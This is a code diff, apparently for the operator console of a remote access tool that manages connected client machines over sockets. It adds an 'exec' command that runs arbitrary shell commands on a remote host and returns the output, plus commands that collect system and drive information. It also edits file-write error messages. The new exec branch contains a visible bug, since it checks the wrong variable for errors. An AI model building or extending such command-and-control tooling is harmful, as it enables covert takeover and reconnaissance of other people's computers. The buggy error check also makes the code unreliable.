@@ -293,7 +293,7 @@ while True:
                             fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])
 
                             if fileSavePath == 'ERROR':
-                                print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
+                                print(f'FAILED TO WRITE {fileName}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                             else:
                                 print(f'File successfully written and saved to {fileSavePath}')
                         except:
@@ -306,7 +306,7 @@ while True:
                                 fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])
 
                                 if fileSavePath == 'ERROR':
-                                    print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
+                                    print(f'FAILED TO WRITE {fileName}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                                 else:
                                     print(f'File successfully written and saved to {fileSavePath}')
                             except:
@@ -373,6 +373,40 @@ while True:
                             print(f'FAILED TO REMOVE {folder}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                         else:
                             print(f'Folder {folder} removed successfully')
+
+                    elif command == 'exec':
+                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('exec'))
+                        executeCommand = input('Enter the command >>> ')
+                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(executeCommand))
+                        commandResult = recvall(CONNECTIONS[CONNECTION_ADDR])
+                        if command == 'ERROR':
+                            print('FAILED TO EXECUTE COMMAND PROPERLY!')
+                        else:
+                            print(commandResult)
+
+                    elif command == 'sysinfo':
+                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('sysinfo'))
+                        sysInfo = recvall(CONNECTIONS[CONNECTION_ADDR])
+                        if sysInfo == 'ERROR':
+                            print('UNABLE TO OBTAIN SYSTEM INFORMATION!')
+                        else:
+                            print(sysInfo)
+
+                    elif command == 'drives':
+                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('drives'))
+                        drives = recvall(CONNECTIONS[CONNECTION_ADDR])
+                        if drives == 'ERROR':
+                            print('UNABLE TO OBTAIN DRIVES INFORMATION!')
+                        else:
+                            print(drives)
+
+                    elif command == 'system':
+                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('system'))
+                        system = recvall(CONNECTIONS[CONNECTION_ADDR])
+                        if system == 'ERROR':
+                            print('UNABLE TO OBTAIN SYSTEM INFORMATION!')
+                        else:
+                            print(system)
 
                     elif command == 'cls':
                         clearTerminal()
